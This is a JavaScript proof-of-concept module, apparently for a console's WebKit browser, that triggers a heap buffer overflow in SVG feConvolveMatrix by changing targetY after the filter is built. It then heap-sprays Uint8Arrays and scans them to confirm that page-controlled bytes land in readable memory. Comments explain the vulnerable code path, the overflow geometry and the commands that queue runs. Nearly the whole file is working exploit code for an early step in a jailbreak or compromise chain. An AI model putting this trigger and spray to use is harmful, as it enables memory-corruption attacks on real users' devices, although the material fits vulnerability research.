// feconv: audit item #5 on the console. An feConvolveMatrix whose target
// offset becomes invalid *after* the filter was built writes past its
// destination pixel buffer:
//
//   SVGFEConvolveMatrixElement::svgAttributeChanged()
//     -> primitiveAttributeChanged()
//     -> setFilterEffectAttribute()
//     -> FEConvolveMatrix::setTargetOffset()      (no rebuild, no validation)
//
// and FEConvolveMatrixSoftwareApplier::applyPlatform() then starts its write
// cursor at (targetOffset.y * width + targetOffset.x) * 4 with only
// markFilterEffectForRepaint() in between. 19.0.0 validates targetX/targetY
// when the effect is *created* and never again, so the markup below builds with
// targetY=1 (valid for order 3) and the page moves it to an out-of-range value
// afterwards (docs/V19-BRANCH.md 9.4, poc/feconvolve-target.html).
//
// Geometry, for a 256x256 filter with order 3: the destination buffer is
// 256*256*4 = 262144 bytes, the write cursor for the first parallel band starts
// at (targetY - 1) rows before the end, and each band walks 42 rows of 1024
// bytes. targetY=45 puts the very first write at byte 262144, i.e. the first
// byte past the buffer, and runs 44,024 bytes past it. Every written byte is
// clamp(totals / divisor + bias) with an all-zero kernel and divisor 1, i.e.
// exactly clamp(bias) -- the page chooses the value.
//
// The host harness answers this with ASAN (W19-BRANCH.md 9.2) and, without
// ASAN, with `double free or corruption (out)` from the allocator (9.7). The
// console has neither, so this experiment answers the question the target
// actually poses: does the overflow reach memory the page can read back?
//
// Oracle: before the trigger, the page allocates a run of Uint8Arrays in the
// same size class as the destination buffer (259 KB vs 256 KB), zero-filled.
// The buffer is allocated during the paint, after that run, so it lands in the
// same region of the peer heap; whatever follows it in address order is a
// chunk the page owns. After the repaint the arrays are scanned for the chosen
// bias byte. Any array that gained 0xNN bytes was overwritten by the overflow,
// and the offsets say how far past the buffer the writes landed. No crash is
// required for a positive result, and a crash is still a result (it means the
// writes reached allocator metadata).
//
// Queue with:
//   sudo node tools/experiment.mjs enqueue feconv --label feconv-1
//   sudo node tools/experiment.mjs enqueue feconv --args '{"targetY":60,"bias":144}' --label feconv-2
// Control (valid offset, same scan):
//   sudo node tools/experiment.mjs enqueue feconv --args '{"targetY":1}' --label feconv-valid
(function () {
  'use strict';
  if (typeof Ns2Webkit === 'undefined' || !Ns2Webkit.registerExperiment)
    throw new Error('feconv: Ns2Webkit.registerExperiment is missing');

  var PERIOD = 250;          // ms between steps; the applet throttles timers
  var DEFAULT_TARGET_Y = 45; // first write at exactly the buffer end
  var DEFAULT_BIAS = 0x90;   // written byte, distinct from the 0x00 spray
  var DEFAULT_SIZE = 262144; // the destination buffer's own size
  var DEFAULT_COUNT = 24;
  var MAX_SPRAY_BYTES = 10 * 1024 * 1024;

  function clampNumber(value, fallback, low, high) {
    var number = Number(value);
    if (!isFinite(number)) return fallback;
    number = Math.floor(number);
    if (number < low) return low;
    if (number > high) return high;
    return number;
  }

  Ns2Webkit.registerExperiment({
    name: 'feconv',
    description: 'feConvolveMatrix invalid targetY: does the overflow reach page memory?',
    run: function (params) {
      var args = (params && params.experimentArgs) || {};
      var targetY = clampNumber(args.targetY, DEFAULT_TARGET_Y, 0, 255);
      var bias = clampNumber(args.bias, DEFAULT_BIAS, 1, 255);
      var count = clampNumber(args.n, DEFAULT_COUNT, 1, 64);
      var size = clampNumber(args.size, DEFAULT_SIZE, 4096, DEFAULT_SIZE);
      // The budget note in the runbook: >14 MB of live allocation kills the
      // page, 8-12 MB survives. Cap the spray well below that.
      if (count * size > MAX_SPRAY_BYTES) {
        count = Math.max(1, Math.floor(MAX_SPRAY_BYTES / size));
      }

      var report = {
        targetY: targetY,
        bias: bias,
        n: count,
        size: size,
        sprayBytes: count * size,
        filter: null,
        // A console without the SVG filter primitives would never run the
        // applier, so a clean scan has to be read together with this.
        hasPrimitiveCtor: typeof SVGFEConvolveMatrixElement === 'function',
        targetBefore: null,
        targetAfter: null,
        repaints: 0,
        scanned: false,
        // Arrays that gained at least one bias byte: the positive signal.
        hits: 0,
        hitIndex: null,
        hitBytes: 0,
        firstWrite: null,
        lastWrite: null,
        // First array that still holds only its fill: the writes did not reach
        // page memory at all (or the filter never ran -- see `filter`).
        clean: null,
        out: 'not-run'
      };

      var host = document.createElement('div');
      host.style.position = 'absolute';
      host.style.left = '0';
      host.style.top = '0';
      host.style.width = '256px';
      host.style.height = '256px';
      // Built with a *valid* target offset: the static path rejects an
      // out-of-range one, which is why the write has to be armed afterwards.
      host.innerHTML =
        '<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256">' +
        '<defs><filter id="f" filterUnits="userSpaceOnUse" x="0" y="0" ' +
        'width="256" height="256"><feConvolveMatrix id="m" in="SourceGraphic" ' +
        'order="3" kernelMatrix="0 0 0 0 0 0 0 0 0" divisor="1" bias="' +
        (bias / 255) + '" targetX="0" targetY="1"></feConvolveMatrix></filter>' +
        '</defs><rect id="r" x="0" y="0" width="256" height="256" ' +
        'fill="#123456" filter="url(#f)"></rect></svg>';
      document.body.appendChild(host);

      var svg = host.firstChild;
      var filter = svg && svg.querySelector ? svg.querySelector('#f') : null;
      var matrix = svg && svg.querySelector ? svg.querySelector('#m') : null;
      var rect = svg && svg.querySelector ? svg.querySelector('#r') : null;
      report.filter = {
        svg: !!svg,
        filter: !!filter,
        matrix: !!matrix,
        rect: !!rect
      };

      if (!matrix || !rect) {
        report.out = 'the SVG filter scaffolding did not build';
        return report;
      }

      var spray = [];

      function repaint() {
        // Alternating fill is an ordinary style change; the interesting part is
        // that it forces the filtered primitive to re-run the applier with the
        // (now invalid) target offset it already holds.
        rect.setAttribute('fill', (++report.repaints & 1) ? '#654321' : '#123456');
        // Force style resolution now, so the paint happens on this task.
        void host.getBoundingClientRect();
      }

      function scan() {
        var fill = bias;
        for (var i = 0; i < spray.length; ++i) {
          var view = spray[i];
          var hits = 0;
          var localFirst = -1;
          var localLast = -1;
          for (var off = 0; off < view.length; ++off) {
            if (view[off] !== fill) continue;
            ++hits;
            if (localFirst < 0) localFirst = off;
            localLast = off;
          }
          if (!hits) {
            if (report.clean === null) report.clean = i;
            continue;
          }
          if (report.hitIndex === null) report.hitIndex = i;
          report.hits += 1;
          report.hitBytes += hits;
          if (report.firstWrite === null) report.firstWrite = localFirst;
          if (report.lastWrite === null || localLast > report.lastWrite) report.lastWrite = localLast;
        }
        report.scanned = true;
        report.out = report.hits
          ? 'overflow reached page memory: ' + report.hits + ' of ' + spray.length
            + ' arrays, ' + report.hitBytes + ' bytes, first at ' + report.firstWrite
          : 'no bias byte in ' + spray.length + ' sprayed arrays';
      }

      // Resolve only after the last step, so the sweep does not tear the page
      // down between the repaint and the scan.
      return new Promise(function (resolve) {
        var step = 0;
        function next() {
          ++step;
          try {
            if (step === 1) {
              // The filter has had one frame with targetY=1. A filter that
              // failed to build would leave targetY.baseVal readable but no
              // effect; this is the only "did it run" signal without ASAN.
              report.targetBefore = matrix.targetY ? matrix.targetY.baseVal : null;
              for (var i = 0; i < count; ++i) spray.push(new Uint8Array(size));
            } else if (step === 2) {
              try {
                matrix.targetY.baseVal = targetY;
              } catch (error) {
                report.out = 'setting targetY threw ' + error;
              }
              report.targetAfter = matrix.targetY ? matrix.targetY.baseVal : null;
              repaint();
            } else if (step === 3) {
              // One more paint while the effect holds the invalid offset: the
              // first repaint may have been coalesced with the style change
              // that armed it.
              if (report.targetAfter === targetY) repaint();
            } else if (step === 4) {
              scan();
              resolve(report);
              return;
            }
          } catch (error) {
            report.out = 'step ' + step + ' threw ' + error;
            resolve(report);
            return;
          }
          setTimeout(next, PERIOD);
        }
        next();
      });
    }
  });
})();
